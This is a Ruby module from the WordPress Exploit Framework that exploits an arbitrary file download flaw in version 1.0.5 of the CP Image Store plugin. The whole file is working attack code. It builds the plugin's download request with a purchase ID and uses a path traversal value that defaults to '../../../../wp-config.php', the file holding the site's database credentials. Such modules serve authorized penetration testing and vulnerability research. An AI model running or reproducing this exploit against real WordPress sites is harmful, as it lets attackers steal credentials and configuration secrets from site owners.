# frozen_string_literal: true

class Wpxf::Auxiliary::CpImageStoreArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'CP Image Store Arbitrary File Download',
      desc: %(
        This module exploits a vulnerability in version 1.0.5 of the CP
        Image Store plugin which allows you to download any arbitrary
        file accessible by the user the web server is running as.
      ),
      author: [
        'Joaquin Ramirez Martinez', # Disclosure
        'rastating'                 # WPXF module
      ],
      references: [
        ['EDB', '37559']
      ],
      date: 'Jun 10 2015'
    )

    register_option(
      IntegerOption.new(
        name: 'purchase_id',
        desc: 'A valid purchase ID',
        required: true,
        default: 1
      )
    )
  end

  def check
    check_plugin_version_from_readme('cp-image-store', '1.0.6', '1.0.5')
  end

  def default_remote_file_path
    '../../../../wp-config.php'
  end

  def working_directory
    'wp-content/plugins/cp-image-store/downloads'
  end

  def purchase_id
    normalized_option_value('purchase_id')
  end

  def download_request_params
    {
      'action' => 'cpis_init',
      'cpis-action' => 'f-download',
      'purchase_id' => purchase_id.to_s,
      'cpis_user_email' => Utility::Text.rand_email,
      'f' => remote_file
    }
  end

  def downloader_url
    full_uri
  end

  def handle_unexpected_http_code(code)
    if code == 302
      emit_error 'The purchase ID appears to be invalid or reached the maximum number of downloads'
      return false
    end

    super
  end

  def run
    res = nil
    scoped_option_change('follow_http_redirection', false) do
      res = super
    end
    res
  end
end
